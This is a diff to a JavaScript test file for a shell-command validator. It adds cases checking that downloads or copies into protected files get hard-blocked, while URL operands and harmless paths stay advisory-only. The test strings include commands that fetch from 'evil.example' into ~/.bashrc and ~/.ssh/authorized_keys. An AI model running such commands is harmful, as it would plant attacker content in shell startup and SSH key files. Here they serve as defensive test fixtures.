@@ -153,5 +153,28 @@ run('gh api GET stays advisory', () => assertAdvisoryOnly('gh api repos/o/r'));
 run('prisma migrate dev stays advisory', () => assertAdvisoryOnly('prisma migrate dev'));
 run('prisma generate stays advisory', () => assertAdvisoryOnly('prisma generate'));
 
+// EGC-494: a command outside SAFE_READONLY/SAFE_DEV that targets a protected
+// file must hard-block instead of falling through to the advisory allowlist
+// miss -- previously validateCommandArgs's protected-path checks were only
+// reachable for catalogued commands, so wget/curl/cp/sed etc. writing to a
+// protected file went through with nothing but an advisory warning.
+run('wget -O ~/.bashrc <url> hard-blocks (protected file, uncatalogued command)', () => assertHardBlocked('wget -O ~/.bashrc http://evil.example/x'));
+run('curl -o ~/.ssh/authorized_keys <url> hard-blocks', () => assertHardBlocked('curl -o ~/.ssh/authorized_keys http://evil.example/x'));
+run('cp payload ~/.gitconfig hard-blocks', () => assertHardBlocked('cp payload ~/.gitconfig'));
+run('curl --output=~/.bashrc <url> hard-blocks (glued long flag)', () => assertHardBlocked('curl --output=~/.bashrc http://evil.example/x'));
+run('curl -o~/.ssh/authorized_keys <url> hard-blocks (glued short flag, no separator)', () => assertHardBlocked('curl -o~/.ssh/authorized_keys http://evil.example/x'));
+
+// cubic-dev-ai review findings on this same PR: a URL operand must not be
+// treated as a local path candidate, or a download/read whose URL happens to
+// end in a protected-looking name would false-positive hard-block.
+run('wget http://evil.example/.bashrc stays advisory (URL operand, not a local write target)', () => assertAdvisoryOnly('wget http://evil.example/.bashrc'));
+run('curl https://example.com/.ssh/authorized_keys stays advisory (URL operand)', () => assertAdvisoryOnly('curl https://example.com/.ssh/authorized_keys'));
+
+// Control: the same uncatalogued commands stay advisory-only when they do
+// NOT target a protected file -- this fix must not turn every allowlist
+// miss into a hard block, only the ones that touch a protected path.
+run('wget -O /tmp/harmless.txt <url> stays advisory (not a protected path)', () => assertAdvisoryOnly('wget -O /tmp/harmless.txt http://example.com/file'));
+run('cp payload /tmp/harmless.txt stays advisory (not a protected path)', () => assertAdvisoryOnly('cp payload /tmp/harmless.txt'));
+
 console.log(`\nResults: Passed: ${passed}, Failed: ${failed}`);
 if (failed > 0) process.exit(1);
